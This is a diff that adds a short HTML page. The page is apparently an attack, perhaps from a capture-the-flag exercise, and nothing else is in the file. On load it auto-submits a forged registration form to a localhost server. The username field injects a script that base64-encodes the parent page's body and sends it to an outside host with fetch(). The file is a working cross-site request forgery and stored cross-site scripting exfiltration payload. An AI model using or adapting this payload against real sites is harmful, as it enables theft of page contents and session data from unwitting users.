@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script type="text/javascript">
+document.write(
+`
+<form id=postform action=http://localhost:8080/register method=post>
+<input type=text name=username value="<script>fetch('http://lhsmathcs.org:8080/' + btoa(parent.parent.document.body.innerHTML))<\/script>">
+<input type=text name=password value=a>
+</form>`);
+document.getElementById('postform').submit();
+
+</script>
+</body>
+</html>
